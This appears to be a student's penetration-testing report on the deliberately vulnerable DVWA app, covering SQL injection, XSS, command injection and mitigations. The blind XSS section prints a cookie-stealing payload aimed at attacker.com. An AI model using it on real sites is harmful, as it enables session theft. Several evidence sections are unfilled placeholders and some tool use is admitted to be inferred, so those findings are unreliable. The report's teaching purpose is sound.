## Overview

This project involved conducting security testing on a deliberately vulnerable web application (DVWA - Damn Vulnerable Web Application) to identify and understand common web application vulnerabilities. The primary goal was to simulate real-world penetration testing scenarios and document the findings.

## Skills Gained

Through this task, the following skills were significantly enhanced:

  * **Web Application Security:** Deepened understanding of common web vulnerabilities and their impact.
  * **Ethical Hacking:** Practical experience in identifying and exploiting security flaws in a controlled environment.
  * **Penetration Testing:** Developed a structured approach to testing, vulnerability analysis, and reporting.
  * **Vulnerability Analysis:** Improved ability to analyze application behavior for potential weaknesses.

## Tools Used

The following industry-standard tools were utilized during the security testing:

  * **Burp Suite:** Used for intercepting, inspecting, and modifying HTTP requests and responses, as well as for various automated and manual testing techniques.
  * **SQLMap:** A powerful open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. (Usage inferred from SQL Injection testing, though not explicitly shown in screenshots).
  * **OWASP ZAP (Zed Attack Proxy):** (While not explicitly visible in screenshots, it's a standard tool for this type of task and would typically be used for automated scanning and further analysis).
  * **Web Browser Developer Tools:** Used for inspecting page source, network requests, and manipulating client-side elements.
  * **Terminal/Command Line Interface:** For executing commands related to tools like SQLMap and other system-level interactions.

## Identified Vulnerabilities

During the security testing, several critical vulnerabilities were identified within the sample web application.

### SQL Injection

**Description:**
SQL Injection vulnerabilities were found, allowing attackers to interfere with the queries that an application makes to its database. By injecting malicious SQL code into input fields, it was possible to bypass authentication, extract sensitive data, and manipulate database records.

**Evidence:**

  * Successful UNION-based SQL injection queries were observed, demonstrating the ability to retrieve database information
   
  * Error-based SQL injection techniques were also identified, revealing database structure and error messages that could be exploited

### Cross-Site Scripting (XSS)

**Description:**
Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject client-side scripts into web pages viewed by other users. This can enable attackers to bypass access controls, impersonate users, deface websites, or steal sensitive information like cookies and session tokens. Different types of XSS were identified during testing:

#### Reflected XSS

**Description:**
Reflected XSS occurs when a malicious script is reflected off of a web application to the user's browser. The script is not stored on the web server; instead, it's immediately executed by the browser after being echoed from the server's response.

**Evidence:**

  * Successful injection of `<script>alert('XSS')</script>` payloads into input fields resulted in immediate pop-up dialogs on the victim's browser, confirming the reflected XSS vulnerability
  * Observation of XSS payloads being directly reflected in the HTTP responses from the server and executed in the browser.

#### DOM-Based XSS

**Description:**
DOM-based XSS (Document Object Model) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM environment in the victim's browser, rather than the HTML source code. This type of XSS often occurs client-side, making it harder to detect with traditional server-side scanning methods.

**Evidence:**

  * (Provide specific examples or screenshots if you have them that show JavaScript manipulation of the DOM leading to XSS. For instance, if an input value is directly written to an element's `innerHTML` without sanitization, and you could demonstrate it with a payload that modifies the page.)
  * The DVWA's DOM-based XSS challenge specifically demonstrates this vulnerability, where client-side scripts process user input unsafely, leading to script execution

#### Blind XSS

**Description:**
Blind XSS occurs when the attacker's payload is stored on the server and later executed in a different part of the application, often on a backend system or by an administrator. The attacker doesn't directly see the output of the XSS payload, hence "blind." This typically involves injecting a payload that attempts to "call back" to a server controlled by the attacker (e.g., using an image tag with an external URL or a script that sends data to an external endpoint).

**Evidence:**

  * (To provide evidence for Blind XSS, you would typically need to show a successful "callback" from the injected payload to a listening server. This might involve a screenshot of your listening server receiving a request after an administrator views the injected content. Since this isn't directly visible in the provided screenshots, you would describe the methodology here if you performed it.)
  * For instance, injecting a payload like `<img src="http://attacker.com/log?cookie=" + document.cookie>` into a field that an administrator later views, leading to a request to `attacker.com`.

### Command Injection

**Description:**
The application was found to be vulnerable to Command Injection, allowing an attacker to execute arbitrary commands on the host operating system via a vulnerable application.

**Evidence:**

  * Successful execution of system commands (e.g., `ping` commands) through input fields, indicating that the application was directly passing user input to system calls without proper sanitization


### Authentication Flaws

**Description:**
(While not explicitly detailed in the provided screenshots, common authentication flaws in such applications include weak password policies, lack of brute-force protection, insecure session management, and insufficient validation of login credentials).

**Evidence:**

  * (To be documented with specific screenshots if available, e.g., demonstrating brute-force attempts or session hijacking).

## Mitigation Strategies

To address the identified vulnerabilities and enhance the security posture of the web application, the following mitigation strategies are recommended:

  * **Input Validation and Sanitization:** Implement strict input validation on all user-supplied data to prevent injection attacks (SQL Injection, XSS, Command Injection). Use parameterized queries or prepared statements for database interactions to prevent SQL injection.
  * **Output Encoding:** Encode all user-generated content before rendering it in the browser to prevent XSS attacks. For DOM-based XSS, ensure that JavaScript functions that process user input are handled securely, avoiding direct `innerHTML` assignments with untrusted data.
  * **Web Application Firewall (WAF):** Deploy a WAF to detect and block malicious traffic, including common web attacks like SQL injection and XSS.
  * **Least Privilege Principle:** Ensure that the application and its database users operate with the minimum necessary privileges.
  * **Error Handling:** Implement robust error handling mechanisms that do not reveal sensitive information about the application's internal structure or database.
  * **Authentication and Session Management:**
      * Enforce strong password policies and multifactor authentication.
      * Implement account lockout mechanisms to prevent brute-force attacks.
      * Use secure and randomly generated session IDs, and invalidate sessions upon logout or inactivity.
      * Ensure all authentication and sensitive data transmission occurs over HTTPS.
  * **Regular Security Audits and Penetration Testing:** Conduct periodic security assessments to identify and remediate new or re-emerging vulnerabilities.
  * **Secure Coding Practices:** Educate developers on secure coding guidelines and best practices to build security into the software development lifecycle (SDLC).
